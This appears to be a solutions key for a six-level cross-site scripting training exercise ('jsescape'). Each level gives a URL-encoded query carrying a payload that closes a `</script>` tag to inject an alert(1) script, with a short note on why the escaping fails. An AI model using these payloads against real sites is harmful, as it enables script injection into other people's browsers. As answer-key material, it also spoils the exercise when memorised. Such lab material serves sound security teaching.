# jsescape — solutions

JS string contexts where the matching quote/backslash is escaped but `</script>` is never blocked — close the script tag.

### jsescape-level1

`/jsescape/level1/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: `"` escaped to `\"`; angle brackets pass through

### jsescape-level2

`/jsescape/level2/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: `'` escaped to `\'`; angle brackets pass through

### jsescape-level3

`/jsescape/level3/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: template literal; `"`/`'` escaped but `` ` `` and angles pass through

### jsescape-level4

`/jsescape/level4/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: `\` and `"` both escaped; angle brackets still pass

### jsescape-level5

`/jsescape/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: dual sink — JS string has `<` encoded, but body reflection is raw

### jsescape-level6

`/jsescape/level6/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: `'` HTML-entity-encoded inside JS (ineffective); angles pass through
